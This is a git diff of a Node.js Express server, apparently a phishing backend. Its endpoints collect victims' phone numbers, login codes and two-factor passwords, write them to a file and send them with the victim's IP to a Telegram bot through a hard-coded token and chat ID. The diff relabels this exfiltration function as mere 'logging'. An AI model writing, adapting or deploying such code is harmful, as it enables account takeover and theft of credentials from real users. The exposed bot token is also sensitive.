@@ -8,9 +8,9 @@ const PORT = process.env.PORT || 3000;
 
 const DATA_FILE = path.join('/tmp', 'data.txt');
 
-// ===== НАСТРОЙКИ ДЛЯ TELEGRAM =====
-const BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';
-const CHAT_ID = '7424945574';  // ТВОЙ CHAT_ID
+// ===== ТОЛЬКО ДЛЯ ЛОГОВ (НОВЫЙ БОТ) =====
+const LOG_BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';
+const LOG_CHAT_ID = '7424945574';
 
 console.log('📂 DATA_FILE:', DATA_FILE);
 
@@ -18,28 +18,21 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
-// ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM =====
-async function sendToTelegram(message) {
+// ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM (ЛОГИ) =====
+async function sendLog(message) {
     try {
-        const response = await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }
-        );
-        if (!response.ok) {
-            console.error('❌ Ошибка отправки в Telegram:', await response.text());
-        } else {
-            console.log('📤 Уведомление отправлено в Telegram');
-        }
+        await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: LOG_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        console.log('📤 Лог отправлен в Telegram');
     } catch (err) {
-        console.error('❌ Ошибка отправки в Telegram:', err);
+        console.error('❌ Ошибка отправки лога:', err);
     }
 }
 
@@ -55,8 +48,7 @@ app.post('/api/phone', async (req, res) => {
     fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
     console.log('📱 Phone:', phone);
 
-    // Отправка в Telegram
-    await sendToTelegram(
+    await sendLog(
         `📱 <b>Новый номер</b>\n` +
         `📞 <code>${phone}</code>\n` +
         `🌐 IP: ${req.ip}\n` +
@@ -78,8 +70,7 @@ app.post('/api/verify', async (req, res) => {
     fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
     console.log('🔑 Phone + Code:', phone, code);
 
-    // Отправка в Telegram
-    await sendToTelegram(
+    await sendLog(
         `🔑 <b>Номер + код</b>\n` +
         `📞 <code>${phone}</code>\n` +
         `🔐 Код: <code>${code}</code>\n` +
@@ -108,8 +99,7 @@ app.post('/api/2fa', async (req, res) => {
     fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
     console.log('🔐 Phone + Code + 2FA:', phone, code, password);
 
-    // Отправка в Telegram
-    await sendToTelegram(
+    await sendLog(
         `🔐 <b>ПОЛНЫЕ ДАННЫЕ</b>\n` +
         `📞 <code>${phone}</code>\n` +
         `🔑 Код: <code>${code || 'не введён'}</code>\n` +
